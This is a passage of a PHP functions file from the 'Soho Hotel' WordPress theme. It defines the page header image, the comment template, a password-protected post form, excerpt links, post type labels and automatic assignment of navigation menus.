	
	global $sohohotel_data;
	
	$output = array();
	
	// Set Title Layout
	
	$sohohotel_individual_title = get_post_meta($sohohotel_get_post_id, 'sohohotel_title_style', true);
	
	if ( !empty($sohohotel_individual_title) ) {
		$output = array(
			'sohohotel-page-header'=>$sohohotel_individual_title
		);
	}
		
	return $output;

}



/* ----------------------------------------------------------------------------

   Page Header Image

---------------------------------------------------------------------------- */
function sohohotel_page_header_image( $image_url ) {
	
	global $sohohotel_data;
	
	$output = '';
	
	if( is_single() || is_front_page() || is_archive() || is_search() ) {
		
		if ( !empty($sohohotel_data['page-header-image']['url'] ) ) {
			$output .= 'style="background:url(' . esc_url($sohohotel_data['page-header-image']['url']) . ') top center;"';
		}
	
	} else {
		
		if ( !empty($image_url) ) {
			$src = $image_url;
			$output .= 'style="background:url(' . esc_url( $src[0] ) . ') top center;"';
		} else {
			
			if ( !empty($sohohotel_data['page-header-image']['url']) ) {
				$output .= 'style="background:url(' . esc_url($sohohotel_data['page-header-image']['url']) . ') top center;"';
			}
			
		}
		
	}
	
	return $output;	
	
}



/* ----------------------------------------------------------------------------

   Comments Template

---------------------------------------------------------------------------- */
if( ! function_exists( 'sohohotel_comments' ) ) {
	function sohohotel_comments($comment, $args, $depth) {
	   $path = get_template_directory_uri();
	   $GLOBALS['comment'] = $comment;
	   ?>
		
	<li <?php comment_class('sohohotel-comment-entry sohohotel-clearfix'); ?> id="sohohotel-comment-<?php comment_ID(); ?>">
		
		<?php $avatar_url = get_template_directory_uri() . '/images/comment.jpg'; ?>
		
		<!-- BEGIN .sohohotel-comment-image -->
		<div class="sohohotel-comment-image">
			<?php echo get_avatar( $comment, 90 ); ?>
		<!-- END .sohohotel-comment-image -->
		</div>
	
		<!-- BEGIN .sohohotel-comment-content -->
		<div class="sohohotel-comment-content sohohotel-clearfix">
					
			<p class="sohohotel-comment-info"><?php printf( esc_html__( '%s', 'soho-hotel' ), sprintf( '%s', get_comment_author_link() ) ); ?> 
				<span><a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
				<?php printf( esc_html__( '%1$s at %2$s', 'soho-hotel' ), get_comment_date(),  get_comment_time() ); ?>
				</a></span>
			</p>
					
			<div class="sohohotel-comment-text">
				<?php if ( $comment->comment_approved == '0' ) : ?>
					<p class="sohohotel-comment-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.', 'soho-hotel' ); ?></p>
				<?php endif; ?>
				<?php comment_text(); ?>
			</div>
			
			<p class="sohohotel-reply">
				<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
				<?php edit_comment_link( esc_html__( '(Edit)', 'soho-hotel' ), ' ' ); ?>
			</p>

		<!-- END .sohohotel-comment-content -->
		</div>
		
		<div class="sohohotel-clearboth"></div>	

	<?php }
}



/* ----------------------------------------------------------------------------

   Password Protected Post Form

---------------------------------------------------------------------------- */
add_filter( 'the_password_form', 'sohohotel_password_form' );

function sohohotel_password_form() {
	
	global $post;
	$label = 'pwbox-'.( empty( $post->ID ) ? rand() : $post->ID );
	$form = '<div class="sohohotel-msg sohohotel-fail sohohotel-clearfix"><p class="sohohotel-nopassword">' . esc_html__( 'This post is password protected. To view it please enter your password below', 'soho-hotel' ) . '</p></div>
<form class="sohohotel-protected-post-form" action="' . get_option('siteurl') . '/wp-login.php?action=postpass" method="post"><label for="' . esc_attr($label) . '">' . esc_html__( 'Password', 'soho-hotel' ) . ' </label><input name="post_password" id="' . esc_attr($label) . '" type="password" size="20" /><div class="sohohotel-clearboth"></div><input type="submit" value="' . esc_attr__( 'Submit','soho-hotel' ) . '" name="submit"></form>';
	return $form;
	
}



/* ----------------------------------------------------------------------------

   Remove width / height attributes from gallery images

---------------------------------------------------------------------------- */
add_filter('wp_get_attachment_link', 'sohohotel_remove_img_width_height', 10, 1);
add_filter('wp_get_attachment_image_attributes', 'sohohotel_remove_img_width_height', 10, 1);

function sohohotel_remove_img_width_height($html) {
    $html = preg_replace( '/(width|height)=\"\d*\"\s/', "", $html );
    return $html;
}



/* ----------------------------------------------------------------------------

   Excerpt More Link

---------------------------------------------------------------------------- */
function sohohotel_new_excerpt_more($more) {
    return '';
}
add_filter('excerpt_more', 'sohohotel_new_excerpt_more', 21 );

function sohohotel_the_excerpt_more_link( $excerpt ){
    $post = get_post();
    $excerpt .= '<a href="'. get_permalink($post->ID) . '" class="sohohotel-more-link">' . esc_html__( 'Read More', 'soho-hotel' ) . '<i class="fa fa-angle-right"></i></a>';
    return $excerpt;
}
add_filter( 'the_excerpt', 'sohohotel_the_excerpt_more_link', 21 );



/* ----------------------------------------------------------------------------

   Post Type Names

---------------------------------------------------------------------------- */
function sohohotel_post_type_name($post_type) {
	
	if ($post_type == 'post') {
		return esc_html__('Post','soho-hotel');
	}
	
	if ($post_type == 'testimonial') {
		return esc_html__('Testimonial','soho-hotel');
	}
	
	if ($post_type == 'page') {
		return esc_html__('Page','soho-hotel');
	}
	
	if ($post_type == 'accommodation') {
		return esc_html__('Room','soho-hotel');
	}
	
}



/* ----------------------------------------------------------------------------

   Automatically assign "Primary Navigation" menu if it exists and is not set

---------------------------------------------------------------------------- */
if ( !has_nav_menu( 'sohohotel-primary' ) ) {
	$menu_header = get_term_by('name', 'Primary Navigation', 'nav_menu');
	$menu_header_id = $menu_header->term_id;

	if ( !empty($menu_header_id) ) {
		$locations = get_theme_mod('nav_menu_locations');
		$locations['sohohotel-primary'] = $menu_header_id;
		set_theme_mod( 'nav_menu_locations', $locations );
	}
}

/* ----------------------------------------------------------------------------

   Automatically assign "Primary Navigation Left" menu if it exists and is not set

---------------------------------------------------------------------------- */
if ( !has_nav_menu( 'sohohotel-primary-left' ) ) {
	$menu_header = get_term_by('name', 'Primary Navigation Left', 'nav_menu');
	$menu_header_id = $menu_header->term_id;

	if ( !empty($menu_header_id) ) {
		$locations = get_theme_mod('nav_menu_locations');
		$locations['sohohotel-primary-left'] = $menu_header_id;
		set_theme_mod( 'nav_menu_locations', $locations );
	}
}

/* ----------------------------------------------------------------------------

   Automatically assign "Primary Navigation Right" menu if it exists and is not set

---------------------------------------------------------------------------- */
if ( !has_nav_menu( 'sohohotel-primary-right' ) ) {
	$menu_header = get_term_by('name', 'Primary Navigation Right', 'nav_menu');
	$menu_header_id = $menu_header->term_id;

	if ( !empty($menu_header_id) ) {
		$locations = get_theme_mod('nav_menu_locations');
		$locations['sohohotel-primary-right'] = $menu_header_id;
		set_theme_mod( 'nav_menu_locations', $locations );
	}
}

/* ----------------------------------------------------------------------------

   Automatically assign "Top Right Navigation" menu if it exists and is not set

---------------------------------------------------------------------------- */
if ( !has_nav_menu( 'sohohotel-top-right' ) ) {
	$menu_header = get_term_by('name', 'Top Right Navigation', 'nav_menu');
	$menu_header_id = $menu_header->term_id;

	if ( !empty($menu_header_id) ) {
		$locations = get_theme_mod('nav_menu_locations');
		$locations['sohohotel-top-right'] = $menu_header_id;
		set_theme_mod( 'nav_menu_locations', $locations );
	}
}